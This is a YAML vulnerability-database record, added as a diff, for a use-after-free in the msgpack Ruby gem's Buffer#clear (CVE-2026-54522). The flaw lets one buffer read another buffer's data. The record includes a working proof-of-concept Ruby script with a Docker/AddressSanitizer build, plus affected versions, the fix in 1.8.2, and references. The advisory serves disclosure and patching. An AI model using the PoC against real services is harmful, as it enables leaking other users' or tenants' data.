@@ -1,0 +1,211 @@
+advisory_id: GHSA-4mrv-5p47-p938
+datasource_id: github_osv/GHSA-4mrv-5p47-p938
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-4mrv-5p47-p938/GHSA-4mrv-5p47-p938.json
+aliases:
+  - CVE-2026-54522
+summary: |
+  MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure
+  ### Summary
+  `MessagePack::Buffer#clear` shifts out every chunk and returns its 4 KiB rmem page to the shared pool, but does not reset the buffer's rmem cursor (`rmem_last`, `rmem_end`, `rmem_owner`). The next write sees "unused rmem space" left over from the freed page and hands back a slice of memory that has already been returned to the pool. A second `MessagePack::Buffer` then re-acquires that same page, so reading the cleared-and-rewritten buffer discloses the second buffer's bytes — a same-process use-after-free with cross-buffer information disclosure (and the symmetric write-corruption).
+
+  ### Details
+  - `msgpack_buffer_clear()` → `_msgpack_buffer_shift_chunk()` (`ext/msgpack/buffer.c:151`, `:128`) destroys chunks (`_msgpack_buffer_chunk_destroy`, `:58`, returns the page via `msgpack_rmem_free`) but resets only `tail_buffer_end`/`read_buffer`, leaving `rmem_last`/`rmem_end`/`rmem_owner` pointing into the freed page.
+  - Next `Buffer#write` → `_msgpack_buffer_chunk_malloc()` reuse branch (`:363`) returns `b->rmem_last`, a pointer into the already-freed page.
+  - A second buffer's first write calls `msgpack_rmem_alloc()` and gets the same physical page back from the pool → the two buffers alias the same memory.
+  - Sanitizer note: rmem (`ext/msgpack/rmem.h`) recycles pages with a slab bitmask, not `free()`, so a stock ASAN build does not abort; the cross-buffer disclosure below is the proof.
+
+  ### PoC
+  Single self-contained script (builds msgpack from rubygems with AddressSanitizer, then runs the PoC):
+
+  ```bash
+  set -e
+  WORK="$(mktemp -d)"; cd "$WORK"
+
+  # 1) PoC
+  cat > poc.rb <<'RUBY'
+  b1 = MessagePack::Buffer.new(nil, write_reference_threshold: 256)
+  b1.write('M' * 1000); b1.write('A' * 200); b1.write('N' * 1000)
+  b1.clear
+  b1.write('C' * 128)
+  secret = ('s' * 200) + ('ABCD' * 32) + ('t' * 400)
+  b2 = MessagePack::Buffer.new(nil, write_reference_threshold: 4096)
+  b2.write(secret)
+  leaked = b1.read_all
+  donor  = b2.read_all
+  puts 'b1_first64:' + leaked.byteslice(0, 64)
+  puts 'b2_donor64:' + donor.byteslice(200, 64)
+  puts 'leaked_is_C:' + (leaked == 'C' * 128).to_s
+  puts 'cross_buffer_match:' + (leaked == donor.byteslice(200, 128)).to_s
+  RUBY
+
+  # 2) ASAN build of msgpackfrom rubygems
+  cat > Dockerfile <<'DOCKER'
+  FROM ruby:3.3-bookworm
+  RUN apt-get update && apt-get install -y --no-install-recommends build-essential libasan8 && rm -rf /var/lib/apt/lists/*
+  RUN gem fetch msgpack -v 1.8.1 && gem unpack msgpack-1.8.1.gem && \
+      cd msgpack-1.8.1/ext/msgpack && \
+      MSGPACK_DEBUG=1 ruby extconf.rb --with-cflags='-O0 -g -fsanitize=address -fno-omit-frame-pointer' --with-ldflags='-fsanitize=address' && \
+      make -j"$(nproc)" && cp msgpack.so ../../lib/msgpack/msgpack.so
+  DOCKER
+  docker build -t msgpack-asan-poc .
+
+  # 3) Run under ASAN
+  docker run --rm -v "$WORK/poc.rb:/poc.rb:ro" msgpack-asan-poc \
+    bash -c 'export LD_PRELOAD=$(gcc -print-file-name=libasan.so); export ASAN_OPTIONS=detect_leaks=0:halt_on_error=1:abort_on_error=1; RUBYLIB=/msgpack-1.8.1/lib ruby -rmsgpack /poc.rb'
+  ```
+
+  Expected output:
+  ```
+  b1_first64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+  b2_donor64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+  leaked_is_C:false
+  cross_buffer_match:true
+  ```
+
+  ### Impact
+  Same-process cross-buffer information disclosure and corruption: after `clear` + reuse, one `MessagePack::Buffer` aliases another's memory, leaking or overwriting serialized data that may belong to a different request or tenant. Requires direct use of the `MessagePack::Buffer` API with a `clear`/reuse lifecycle (a supported performance pattern); not reachable from a plain `unpack` byte stream. Real-world severity **Low–Medium**; clear memory-safety defect with a small, localized fix.
+
+  ### Credit
+  Pranjali Thakur - depthfirst ([depthfirst.com](<http://depthfirst.com>))
+impacted_packages:
+  - purl: pkg:gem/msgpack
+    affected_versions: vers:gem/<=1.8.1
+    fixed_versions: vers:gem/1.8.2
+    affected_packages:
+      - pkg:gem/msgpack@0.0.1
+      - pkg:gem/msgpack@0.2.0
+      - pkg:gem/msgpack@0.2.1
+      - pkg:gem/msgpack@0.2.2
+      - pkg:gem/msgpack@0.3.0
+      - pkg:gem/msgpack@0.3.1
+      - pkg:gem/msgpack@0.3.2
+      - pkg:gem/msgpack@0.3.3
+      - pkg:gem/msgpack@0.3.4
+      - pkg:gem/msgpack@0.3.5
+      - pkg:gem/msgpack@0.3.6
+      - pkg:gem/msgpack@0.3.7
+      - pkg:gem/msgpack@0.3.8
+      - pkg:gem/msgpack@0.3.9
+      - pkg:gem/msgpack@0.4.0
+      - pkg:gem/msgpack@0.4.1
+      - pkg:gem/msgpack@0.4.2
+      - pkg:gem/msgpack@0.4.3
+      - pkg:gem/msgpack@0.4.4
+      - pkg:gem/msgpack@0.4.5
+      - pkg:gem/msgpack@0.4.6
+      - pkg:gem/msgpack@0.4.7
+      - pkg:gem/msgpack@0.5.0
+      - pkg:gem/msgpack@0.5.1
+      - pkg:gem/msgpack@0.5.2
+      - pkg:gem/msgpack@0.5.3
+      - pkg:gem/msgpack@0.5.4
+      - pkg:gem/msgpack@0.5.5
+      - pkg:gem/msgpack@0.5.6
+      - pkg:gem/msgpack@0.5.7
+      - pkg:gem/msgpack@0.5.8
+      - pkg:gem/msgpack@0.5.9
+      - pkg:gem/msgpack@0.5.10
+      - pkg:gem/msgpack@0.5.11
+      - pkg:gem/msgpack@0.5.12
+      - pkg:gem/msgpack@0.6.0pre1
+      - pkg:gem/msgpack@0.6.0
+      - pkg:gem/msgpack@0.6.1
+      - pkg:gem/msgpack@0.6.2
+      - pkg:gem/msgpack@0.7.0dev1
+      - pkg:gem/msgpack@0.7.0
+      - pkg:gem/msgpack@0.7.1
+      - pkg:gem/msgpack@0.7.2dev1
+      - pkg:gem/msgpack@0.7.2
+      - pkg:gem/msgpack@0.7.3
+      - pkg:gem/msgpack@0.7.4
+      - pkg:gem/msgpack@0.7.5
+      - pkg:gem/msgpack@0.7.6
+      - pkg:gem/msgpack@1.0.0
+      - pkg:gem/msgpack@1.0.1
+      - pkg:gem/msgpack@1.0.2
+      - pkg:gem/msgpack@1.0.3
+      - pkg:gem/msgpack@1.1.0
+      - pkg:gem/msgpack@1.2.0
+      - pkg:gem/msgpack@1.2.1
+      - pkg:gem/msgpack@1.2.2
+      - pkg:gem/msgpack@1.2.3
+      - pkg:gem/msgpack@1.2.4
+      - pkg:gem/msgpack@1.2.5
+      - pkg:gem/msgpack@1.2.6
+      - pkg:gem/msgpack@1.2.7
+      - pkg:gem/msgpack@1.2.8
+      - pkg:gem/msgpack@1.2.9
+      - pkg:gem/msgpack@1.2.10
+      - pkg:gem/msgpack@1.3.0
+      - pkg:gem/msgpack@1.3.1
+      - pkg:gem/msgpack@1.3.2
+      - pkg:gem/msgpack@1.3.3
+      - pkg:gem/msgpack@1.4.0.pre1
+      - pkg:gem/msgpack@1.4.0
+      - pkg:gem/msgpack@1.4.1
+      - pkg:gem/msgpack@1.4.2
+      - pkg:gem/msgpack@1.4.3
+      - pkg:gem/msgpack@1.4.4.pre1
+      - pkg:gem/msgpack@1.4.4
+      - pkg:gem/msgpack@1.4.5
+      - pkg:gem/msgpack@1.5.0
+      - pkg:gem/msgpack@1.5.1
+      - pkg:gem/msgpack@1.5.2
+      - pkg:gem/msgpack@1.5.3
+      - pkg:gem/msgpack@1.5.4
+      - pkg:gem/msgpack@1.5.5
+      - pkg:gem/msgpack@1.5.6
+      - pkg:gem/msgpack@1.6.0
+      - pkg:gem/msgpack@1.6.1
+      - pkg:gem/msgpack@1.7.0
+      - pkg:gem/msgpack@1.7.1
+      - pkg:gem/msgpack@1.7.2
+      - pkg:gem/msgpack@1.7.3
+      - pkg:gem/msgpack@1.7.4
+      - pkg:gem/msgpack@1.7.5
+      - pkg:gem/msgpack@1.8.0
+      - pkg:gem/msgpack@1.8.1
+    fixed_packages:
+      - pkg:gem/msgpack@1.8.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/msgpack/msgpack-ruby
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/msgpack/msgpack-ruby
+        commit: 5627d71606b565641d2dd501b82aae862f4abe90
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '2.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-4mrv-5p47-p938/GHSA-4mrv-5p47-p938.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-416
+references:
+  - url: https://github.com/msgpack/msgpack-ruby
+    reference_type:
+    reference_id:
+  - url: https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml
+    reference_type:
+    reference_id:
+  - url: https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522
+    reference_type:
+    reference_id:
+  - url: https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90
+    reference_type: other
+    reference_id: 5627d71606b565641d2dd501b82aae862f4abe90
+  - url: https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938
+    reference_type: other
+    reference_id: GHSA-4mrv-5p47-p938
+exploits: []
